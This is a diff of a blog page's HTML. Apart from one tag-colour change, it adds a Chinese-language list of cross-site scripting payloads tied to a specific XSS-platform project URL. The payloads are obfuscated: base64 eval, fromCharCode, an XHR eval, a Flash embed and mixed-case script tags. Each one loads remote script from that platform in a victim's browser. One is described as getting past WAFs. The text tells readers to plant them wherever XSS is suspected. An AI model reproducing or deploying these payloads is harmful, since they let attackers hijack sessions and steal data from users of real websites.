@@ -196,7 +196,7 @@
             
             <span class="tag">
                 
-                <a href="/tags/xss/" style="color: #00a596">xss</a>
+                <a href="/tags/xss/" style="color: #03a9f4">xss</a>
             </span>
             
         </span>
@@ -209,7 +209,30 @@
       
     </div>
     
-        
+        <p><a target="_blank" rel="noopener" href="https://xss.yt/index/user.html">XSS平台</a></p>
+<pre><code class="bash">将如下代码植入怀疑出现xss的地方（注意&#39;的转义），即可在 项目内容 观看XSS效果。
+
+当前项目URL地址为：https://xss.yt/YLgl        【注意新增https，插入对方网站代码前缀http或者https都可】
+
+&lt;/tExtArEa&gt;&#39;&quot;&gt;&lt;sCRiPt sRC=//xss.yt/YLgl&gt;&lt;/sCrIpT&gt;
+或者
+
+&#39;&quot;&gt;&lt;input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnl0L1lMZ2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 autofocus&gt;
+&#39;&quot;&gt;&lt;img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnl0L1lMZ2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))&gt;
+&#39;&quot;&gt;&lt;video&gt;&lt;source onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnl0L1lMZ2wiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7&gt;
+&#39;&quot;&gt;&lt;script&gt;function b()&#123;eval(this.responseText)&#125;;a=new XMLHttpRequest();a.addEventListener(&quot;load&quot;, b);a.open(&quot;GET&quot;, &quot;https://xss.yt/YLgl&quot;);a.send();&lt;/script&gt;
+&lt;img src=x onerror=s=createElement(&#39;script&#39;);body.appendChild(s);s.src=&#39;//xss.yt/YLgl&#39;;&gt;
+下方XSS代码过一般WAF [注意如果直接把代码放入Burp，111则需要把下方代码进行URL编码]
+
+&lt;embed src=https://xss.yt/liuyan/xs.swf?a=e&amp;c=docu0075ment.write(Stu0072ing.fromu0043harCode(60,115,67,82,105,80,116,32,115,82,67,61,47,47,120,115,115,46,121,116,47,89,76,103,108,62,60,47,115,67,114,73,112,84,62)) allowscriptaccess=always type=application/x-shockwave-flash&gt;&lt;/embed&gt;
+若使用下方XSS代码请注意(下面代码会引起网页空白不得已慎用，注意如果使用下面的代码，一定要勾选&quot;基础默认XSS&quot;模块)
+
+&lt;img src=&quot;&quot; onerror=&quot;document.write(String.fromCharCode(60,115,67,82,105,80,116,32,115,82,67,61,47,47,120,115,115,46,121,116,47,89,76,103,108,62,60,47,115,67,114,73,112,84,62))&quot;&gt;
+↓↓↓！~极限代码~！(可以不加最后的&gt;回收符号，下面代码已测试成功)↓↓↓
+
+&lt;sCRiPt/SrC=//xss.yt/YLgl&gt;
+</code></pre>
+
     </div>
     
     
